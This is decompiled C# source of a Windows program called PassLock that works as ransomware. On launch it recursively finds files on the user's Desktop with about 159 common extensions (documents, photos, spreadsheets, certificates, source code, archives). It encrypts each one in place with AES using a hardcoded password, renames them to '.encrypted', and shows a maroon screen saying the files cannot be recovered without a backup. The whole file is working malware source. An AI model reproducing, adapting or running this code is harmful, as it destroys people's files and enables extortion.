using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using PassLock.My;
using PassLock.My.Resources;

namespace PassLock;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	[field: AccessedThroughProperty("PictureBox1")]
	internal virtual PictureBox PictureBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("PictureBox2")]
	internal virtual PictureBox PictureBox2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label2")]
	internal virtual Label Label2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label3")]
	internal virtual Label Label3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual LinkLabel LinkLabel1
	{
		[CompilerGenerated]
		get
		{
			return _LinkLabel1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			LinkLabelLinkClickedEventHandler val = new LinkLabelLinkClickedEventHandler(LinkLabel1_LinkClicked);
			LinkLabel linkLabel = _LinkLabel1;
			if (linkLabel != null)
			{
				linkLabel.remove_LinkClicked(val);
			}
			_LinkLabel1 = value;
			linkLabel = _LinkLabel1;
			if (linkLabel != null)
			{
				linkLabel.add_LinkClicked(val);
			}
		}
	}

	[field: AccessedThroughProperty("Label4")]
	internal virtual Label Label4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label5")]
	internal virtual Label Label5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label6")]
	internal virtual Label Label6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label7")]
	internal virtual Label Label7
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button Button1
	{
		[CompilerGenerated]
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Button1_Click;
			Button button = _Button1;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button1 = value;
			button = _Button1;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		Inizio();
	}

	public static IEnumerable<string> CercaFile(string percorso, IEnumerable<string> mEstensioni)
	{
		return (from mFile in Directory.GetFiles(percorso, "*", SearchOption.AllDirectories)
			where mEstensioni.Contains(Path.GetExtension(mFile)!.ToLower())
			select mFile).ToList();
	}

	public static void RoutineDiCrittografia(string nome, string password)
	{
		int try0000_dispatch = -1;
		int num = default(int);
		byte[] array = default(byte[]);
		int num2 = default(int);
		int num3 = default(int);
		RijndaelManaged rijndaelManaged = default(RijndaelManaged);
		byte[] array2 = default(byte[]);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					num = 1;
					array = new byte[32];
					goto IL_000a;
				case 273:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_001e;
						case 4:
							goto IL_004b;
						case 5:
							goto IL_0055;
						case 6:
							goto IL_00c5;
						case 7:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 8:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_00c5:
					ProjectData.ClearProjectError();
					num3 = 1;
					break;
					IL_000a:
					num = 2;
					Encoding.Default.GetBytes(password).CopyTo(array, 0);
					goto IL_001e;
					IL_001e:
					num = 3;
					rijndaelManaged = new RijndaelManaged
					{
						Mode = CipherMode.CBC,
						KeySize = 256,
						BlockSize = 256,
						Padding = PaddingMode.Zeros
					};
					goto IL_004b;
					IL_004b:
					num = 4;
					array2 = File.ReadAllBytes(nome);
					goto IL_0055;
					IL_0055:
					num = 5;
					using (MemoryStream memoryStream = new MemoryStream())
					{
						using CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(array, array), CryptoStreamMode.Write);
						cryptoStream.Write(array2, 0, array2.Length);
						byte[] array3 = memoryStream.ToArray();
						byte[] array4 = new byte[checked(array3.Length - 1 + 1)];
						array3.CopyTo(array4, 0);
						File.WriteAllBytes(nome, array4);
					}
					goto IL_00c5;
					end_IL_0000_2:
					break;
				}
				num = 7;
				File.Move(nome, nome + ".encrypted");
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 273;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void Inizio()
	{
		IEnumerable<string> mEstensioni = new string[159]
		{
			".3dm", ".3g2", ".3gp", ".aaf", ".accdb", ".aep", ".aepx", ".aet", ".ai", ".aif",
			".arw", ".as", ".as3", ".asf", ".asp", ".asx", ".avi", ".bay", ".bmp", ".cdr",
			".cer", ".class", ".cpp", ".cr2", ".crt", ".crw", ".cs", ".csv", ".db", ".dbf",
			".dcr", ".der", ".dng", ".doc", ".docb", ".docm", ".docx", ".dot", ".dotm", ".dotx",
			".dwg", ".dxf", ".dxg", ".efx", ".eps", ".erf", ".fla", ".flv", ".idml", ".iff",
			".indb", ".indd", ".indl", ".indt", ".inx", ".jar", ".java", ".jpeg", ".jpg", ".kdc",
			".m3u", ".m3u8", ".m4u", ".max", ".mdb", ".mdf", ".mef", ".mid", ".mov", ".mp3",
			".mp4", ".mpa", ".mpeg", ".mpg", ".mrw", ".msg", ".nef", ".nrw", ".odb", ".odc",
			".odm", ".odp", ".ods", ".odt", ".orf", ".p12", ".p7b", ".p7c", ".pdb", ".pdf",
			".pef", ".pem", ".pfx", ".php", ".plb", ".pmd", ".pot", ".potm", ".potx", ".ppam",
			".ppj", ".pps", ".ppsm", ".ppsx", ".ppt", ".pptm", ".pptx", ".prel", ".prproj", ".ps",
			".psd", ".pst", ".ptx", ".png", ".r3d", ".ra", ".raf", ".rar", ".raw", ".rb",
			".rtf", ".rw2", ".rwl", ".sdf", ".sldm", ".sldx", ".sql", ".sr2", ".srf", ".srw",
			".svg", ".swf", ".tif", ".vcf", ".vob", ".wav", ".wb2", ".wma", ".wmv", ".wpd",
			".wps", ".x3f", ".xla", ".xlam", ".xlk", ".xll", ".xlm", ".xls", ".xlsb", ".xlsm",
			".xlsx", ".xlt", ".xltm", ".xltx", ".xlw", ".xml", ".xqx", ".zip", ".txt"
		};
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		foreach (string item in CercaFile(folderPath, mEstensioni))
		{
			RoutineDiCrittografia(item, "iMpediToO");
		}
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		((Form)this).Close();
	}

	private void LinkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		((Form)MyProject.Forms.Form2).ShowDialog();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_0136: Unknown result type (might be due to invalid IL or missing references)
		//IL_0140: Expected O, but got Unknown
		//IL_024e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0258: Expected O, but got Unknown
		//IL_03d9: Unknown result type (might be due to invalid IL or missing references)
		//IL_03e3: Expected O, but got Unknown
		//IL_04e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_04ec: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		PictureBox1 = new PictureBox();
		Label1 = new Label();
		PictureBox2 = new PictureBox();
		Label2 = new Label();
		Label3 = new Label();
		LinkLabel1 = new LinkLabel();
		Label4 = new Label();
		Label5 = new Label();
		Label6 = new Label();
		Label7 = new Label();
		Button1 = new Button();
		((ISupportInitialize)PictureBox1).BeginInit();
		((ISupportInitialize)PictureBox2).BeginInit();
		((Control)this).SuspendLayout();
		PictureBox1.set_Image((Image)(object)Resources.logo);
		((Control)PictureBox1).set_Location(new Point(22, 22));
		((Control)PictureBox1).set_Name("PictureBox1");
		((Control)PictureBox1).set_Size(new Size(130, 130));
		PictureBox1.set_SizeMode((PictureBoxSizeMode)2);
		PictureBox1.set_TabIndex(0);
		PictureBox1.set_TabStop(false);
		Label1.set_AutoSize(true);
		((Control)Label1).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label1).set_ForeColor(Color.White);
		((Control)Label1).set_Location(new Point(214, 9));
		((Control)Label1).set_Name("Label1");
		((Control)Label1).set_Size(new Size(306, 20));
		((Control)Label1).set_TabIndex(1);
		Label1.set_Text("Stop, your files have been encrypted!");
		((Control)PictureBox2).set_BackColor(Color.White);
		PictureBox2.set_BorderStyle((BorderStyle)2);
		((Control)PictureBox2).set_Location(new Point(168, 32));
		((Control)PictureBox2).set_Name("PictureBox2");
		((Control)PictureBox2).set_Size(new Size(400, 196));
		PictureBox2.set_TabIndex(2);
		PictureBox2.set_TabStop(false);
		Label2.set_AutoSize(true);
		((Control)Label2).set_BackColor(Color.White);
		((Control)Label2).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label2).set_Location(new Point(171, 35));
		((Control)Label2).set_Name("Label2");
		((Control)Label2).set_Size(new Size(125, 16));
		((Control)Label2).set_TabIndex(3);
		Label2.set_Text("What happened?");
		Label3.set_AutoSize(true);
		((Control)Label3).set_BackColor(Color.White);
		((Control)Label3).set_Location(new Point(171, 51));
		((Control)Label3).set_Name("Label3");
		((Control)Label3).set_Size(new Size(397, 39));
		((Control)Label3).set_TabIndex(4);
		Label3.set_Text(componentResourceManager.GetString("Label3.Text"));
		((Label)LinkLabel1).set_AutoSize(true);
		((Control)LinkLabel1).set_BackColor(Color.White);
		((Control)LinkLabel1).set_Location(new Point(471, 64));
		((Control)LinkLabel1).set_Name("LinkLabel1");
		((Control)LinkLabel1).set_Size(new Size(49, 13));
		((Control)LinkLabel1).set_TabIndex(5);
		LinkLabel1.set_TabStop(true);
		LinkLabel1.set_Text("AES-256");
		Label4.set_AutoSize(true);
		((Control)Label4).set_BackColor(Color.White);
		((Control)Label4).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label4).set_Location(new Point(171, 90));
		((Control)Label4).set_Name("Label4");
		((Control)Label4).set_Size(new Size(165, 16));
		((Control)Label4).set_TabIndex(6);
		Label4.set_Text("Can I recover my files?");
		Label5.set_AutoSize(true);
		((Control)Label5).set_BackColor(Color.White);
		((Control)Label5).set_Location(new Point(171, 106));
		((Control)Label5).set_Name("Label5");
		((Control)Label5).set_Size(new Size(379, 26));
		((Control)Label5).set_TabIndex(7);
		Label5.set_Text("No, you can't recover your files if you don't have a backup. The files cannot be\r\ndecrypted.");
		Label6.set_AutoSize(true);
		((Control)Label6).set_BackColor(Color.White);
		((Control)Label6).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label6).set_Location(new Point(171, 132));
		((Control)Label6).set_Name("Label6");
		((Control)Label6).set_Size(new Size(41, 16));
		((Control)Label6).set_TabIndex(8);
		Label6.set_Text("Note");
		Label7.set_AutoSize(true);
		((Control)Label7).set_BackColor(Color.White);
		((Control)Label7).set_Location(new Point(171, 148));
		((Control)Label7).set_Name("Label7");
		((Control)Label7).set_Size(new Size(380, 65));
		((Control)Label7).set_TabIndex(9);
		Label7.set_Text(componentResourceManager.GetString("Label7.Text"));
		((Control)Button1).set_Location(new Point(168, 234));
		((Control)Button1).set_Name("Button1");
		((Control)Button1).set_Size(new Size(400, 26));
		((Control)Button1).set_TabIndex(10);
		((ButtonBase)Button1).set_Text("Exit");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.Maroon);
		((Form)this).set_ClientSize(new Size(580, 272));
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Control)this).get_Controls().Add((Control)(object)Label7);
		((Control)this).get_Controls().Add((Control)(object)Label6);
		((Control)this).get_Controls().Add((Control)(object)Label5);
		((Control)this).get_Controls().Add((Control)(object)Label4);
		((Control)this).get_Controls().Add((Control)(object)LinkLabel1);
		((Control)this).get_Controls().Add((Control)(object)Label3);
		((Control)this).get_Controls().Add((Control)(object)Label2);
		((Control)this).get_Controls().Add((Control)(object)PictureBox2);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)PictureBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("PassLock");
		((ISupportInitialize)PictureBox1).EndInit();
		((ISupportInitialize)PictureBox2).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
